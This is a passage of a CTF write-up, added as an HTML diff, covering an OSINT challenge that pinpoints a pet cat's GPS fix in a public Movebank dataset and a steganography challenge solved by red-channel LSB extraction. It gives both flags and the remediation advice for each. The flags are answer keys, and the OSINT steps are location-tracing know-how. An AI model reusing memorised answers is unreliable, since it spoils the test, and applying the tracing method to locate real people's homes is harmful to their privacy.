+<li>Hypotheses ruled out (per the notes): the public DOI datasets in the Movebank Data Repository contain no German cats; the Spanish 'Luna' (FC042) does not match the coordinates or timestamps; the data is not in GBIF or Zenodo either; the anonymous Movebank API returns 401.</li>
+<li>Supporting tool: <code>tools/wcsc-luna/find_luna.py</code> (searched 'Luna' in reference data across 17 Germany-related MDR datasets; no results).</li>
+</ul>
+<h3 id="3-steps_13">3. Steps</h3>
+<ol>
+<li>After logging in to Movebank, fetch the full study list (2,082 entries) via <code>direct-read?entity_type=study</code> and filter for <code>taxon_ids</code> containing Felis with <code>main_location</code> near Konstanz → study 1894170572 "Pet cat Germany MPIAB 2022" (Felis catus, PI Martin Wikelski, CC0, 2021-12-18 to 2022-06-18). (The exact commands used for login and listing were not recorded in the notes.)</li>
+<li>The study's first fix is at 2021-12-18 09:00:51, 20 seconds from the challenge's 09:01:11 → confirmed.</li>
+<li>After accepting the CC0 licence, download the CSV through the web UI (<code>evidence/wcsc-luna/petcat2022.csv</code>, 84,450 rows). Individuals: <code>Luna_AT</code>, <code>Luna_allGPS</code>, <code>Luna_in_out</code>.</li>
+<li>Anchor validation: 2021-12-18 09:01:11 → lat 47.68898, long 9.140407 (exactly the value given in the challenge).</li>
+<li>Target fix: 2021-12-19 06:16:33 → lat 47.688288, long 9.14061 (identical in <code>Luna_in_out</code> and <code>Luna_allGPS</code>). Rounded → 47.6883, 9.1406.</li>
+<li>For contrast, nearby fixes (<code>evidence/wcsc-luna/02_answer.txt</code>) in the 06:10:00–06:10:07 window sit around 47.68934, 9.14086, distinct from the target time.</li>
+</ol>
+<p>Reproduction (outline): look up the row for the timestamp in the CSV. The column names were not recorded in the notes, so check the CSV header first.</p>
+<pre><code class="language-bash">grep -F &quot;2021-12-19 06:16:33&quot; evidence/wcsc-luna/petcat2022.csv | head
+</code></pre>
+<h3 id="4-result_13">4. Result</h3>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{47.6883_9.1406}</code></li>
+<li>Time obtained: 2026-10-30 14:05 UTC (23:05 KST), first entry in <code>notes/FLAGS.md</code> — converted from the workstation's local timezone (Asia/Bangkok, UTC+07)</li>
+<li>Evidence: <code>evidence/wcsc-luna/02_answer.txt</code>, <code>evidence/wcsc-luna/petcat2022.csv</code>. Beyond scoring, the anchor match (the 2021-12-18 09:01:11 coordinate) confirms the dataset.</li>
+</ul>
+<h3 id="5-root-cause-and-remediation_12">5. Root cause and remediation</h3>
+<ul>
+<li><strong>Classification:</strong> exposure of location data through public sources (OSINT); in the nature of CWE-359 (exposure of private personal information)</li>
+<li><strong>Mitigation:</strong> when publishing pet or personal GPS tracks, mask coordinates near the home, delay publication, or reduce spatial resolution; anonymise public dataset metadata (individual names, date ranges, locations) so it cannot serve as a lookup key.</li>
+</ul>
+<hr>
+<h2 id="14-forensicsstego-leonne-stratvarius-bonnie-kitty-250">14. [Forensics/Stego] Leonne Stratvarius Bonnie (kitty) — 250</h2>
+<p><strong>One-line summary:</strong> A base64 PNG (128x128 RGBA) embedded in <code>kitty_cat_challenge.html</code> with <code>display:none</code> carries the flag in the LSBs of its red channel, behind a length prefix (0x18).</p>
+<h3 id="1-problem-summary_14">1. Problem summary</h3>
+<ul>
+<li>Provided: <code>kitty_cat_challenge.html</code> (a Three.js 3D cat simulator, 75 KB). No server.</li>
+<li>Goal: find the hidden flag.</li>
+</ul>
+<h3 id="2-analysis_14">2. Analysis</h3>
+<ul>
+<li><strong>Observation:</strong> the HTML contains <code>&lt;img id="_texmap" src="data:image/png;base64,..."&gt;</code> hidden with <code>display:none</code>, with comments disguising it as "Embedded texture asset for 3D model rendering pipeline" / "do not remove".</li>
+<li><strong>Correction (re-checked in the notes on 2026-10-30):</strong> the image is <em>not</em> a decoy. At HTML lines 175–184 it is used as the actual cat material via <code>new THREE.Texture(texImg)</code> → <code>MeshLambertMaterial({ map: texture })</code>. The comments are truthful — the data is hidden inside a genuinely used texture.</li>
+<li>The decoded PNG is 128x128 RGBA, 40,586 bytes. The size is abnormally large, suggesting noise (an LSB payload). The chunks are only IHDR/IDAT/IEND with no trailing data after IEND → the payload is in pixel LSBs.</li>
+</ul>
+<h3 id="3-steps_14">3. Steps</h3>
+<ol>
+<li>Extract and decode the base64, saving it as a PNG (the exact commands were not recorded in the notes).</li>
+<li>Collect the red-channel LSB of each pixel in order, MSB-first, and pack into bytes. (The extraction script is not present under <code>tools/</code>; the result is in <code>evidence/wcsc-kitty/01_lsb_extract.txt</code>.) The sketch below reproduces the same operation:</li>
+</ol>
+<pre><code class="language-python">from PIL import Image
+im = Image.open(&quot;evidence/wcsc-kitty/texmap.png&quot;).convert(&quot;RGBA&quot;)   # example path (saved filename not recorded)
+bits = [r &amp; 1 for (r, g, b, a) in im.getdata()]
+data = bytes(int(&quot;&quot;.join(map(str, bits[i:i+8])), 2) for i in range(0, len(bits) - 7, 8))
+n = int.from_bytes(data[:4], &quot;big&quot;)        # 0x18 = 24
+print(data[4:4+n])
+</code></pre>
+<ol start="3">
+<li>Resulting stream: <code>00 00 00 18</code> (big-endian length 24) + <code>WCSC{kitty_cat_meow_csc}</code> + zero padding. "WCSC" appears at offset 4 (<code>evidence/wcsc-kitty/01_lsb_extract.txt</code>).</li>
+<li>The G/B/A channels and an RGB-interleaved reading produced meaningless data; the red channel alone is the correct extraction path.</li>
+</ol>
+<h3 id="4-result_14">4. Result</h3>
+<ul>
+<li><strong>Flag:</strong> <code>WCSC{kitty_cat_meow_csc}</code></li>
+<li>Time obtained: 2026-10-30 14:08 UTC (23:08 KST), first entry in <code>notes/FLAGS.md</code> — converted from the workstation's local timezone (Asia/Bangkok, UTC+07)</li>
+<li>Evidence: <code>evidence/wcsc-kitty/01_lsb_extract.txt</code></li>
+</ul>
+<h3 id="5-root-cause-and-remediation_13">5. Root cause and remediation</h3>
+<ul>
+<li><strong>Classification:</strong> steganography (data hiding); no applicable CWE (a CTF covert-channel exercise)</li>
+<li><strong>Detection-side mitigation:</strong> check <code>data:</code> URI images embedded in web pages for anomalous size and entropy; review assets inside hidden elements (<code>display:none</code>); apply statistical LSB analysis (chi-square, RS analysis).</li>
+</ul>
+</main>
+</body>
+</html>
